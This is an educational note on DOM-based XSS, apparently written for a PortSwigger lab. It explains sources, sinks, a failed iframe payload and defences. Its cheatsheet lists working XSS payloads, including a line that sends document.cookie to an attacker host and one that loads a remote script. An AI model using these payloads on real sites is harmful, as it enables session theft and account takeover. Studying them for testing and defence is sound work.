
# 🧠 Understanding the DOM XSS Payload in Depth

## 🔍 Payload Breakdown

```html
<iframe src="https://0ab1008204d59a4480430d7200be00c0.web-security-academy.net/#" 
        onload="this.src+='<img src=1 onerror=print()>'">
</iframe>
```

### ✅ Goal:

Trigger a DOM-based XSS by using an iframe's `onload` event to execute a script.

### ❌ Why it fails:

`this.src += '<img src=1 onerror=print()>'` tries to **modify the URL**, not the HTML content. Browsers do not interpret HTML inside the URL string.

---

## ✅ DOM XSS Concepts (Lifetime Understandable)

### 🔸 DOM XSS

- Happens **entirely in the browser**
- Doesn't reach the server
- Triggered when a page uses user-controllable data in the DOM **without sanitization**

### 🔸 Common vulnerable sinks:

```js
document.write()
element.innerHTML
eval()
setTimeout("code")
document.location
window.name
```

### 🔸 Common sources:

```js
location.hash
location.search
document.referrer
window.name
```

---

## 🛠️ Working DOM XSS Payload Example

```html
<iframe src="https://victim-site/#<img src=x onerror=alert(1)>"></iframe>
```

This only works if the page uses the hash in DOM, like:

```js
document.body.innerHTML = location.hash;
```

---

## ⚒️ Tips & Tricks for DOM XSS

1. Grep for DOM sinks in JS files: `innerHTML`, `eval`, `document.write`
2. Use DevTools or PortSwigger's **DOM Invader**
3. Fuzz `#`, `?`, or user-controllable inputs

---

## 🔥 DOM XSS Payload Cheatsheet

```html
#<img src=x onerror=alert(1)>
#<svg onload=alert(1)>
#<script>alert(1)</script>
"><script>alert(1)</script>
#"><img src=x onerror=alert(document.domain)>
<iframe src="javascript:alert(1)"></iframe>
<script>fetch('https://attacker.com/'+document.cookie)</script>
<script src=//xss.rocks/xss.js></script>
```

---

## 🛡️ Preventing DOM XSS

- Never use user input directly in `innerHTML` or `document.write`
- Sanitize input using libraries like **DOMPurify**
- Use **Content Security Policy (CSP)** to limit script execution

---

## 👑 Final Wisdom

> ✅ If your payload lands in a **script block**, use JS injections  
> ✅ If it lands in **HTML**, use tags like `<img>`, `<svg>`, or `<script>`  
> ✅ If it lands in **URLs**, try breaking the context or injecting `javascript:` schemes

---

Stay sharp, hacker 🧠🔐 and may your payloads always land where they should 💥
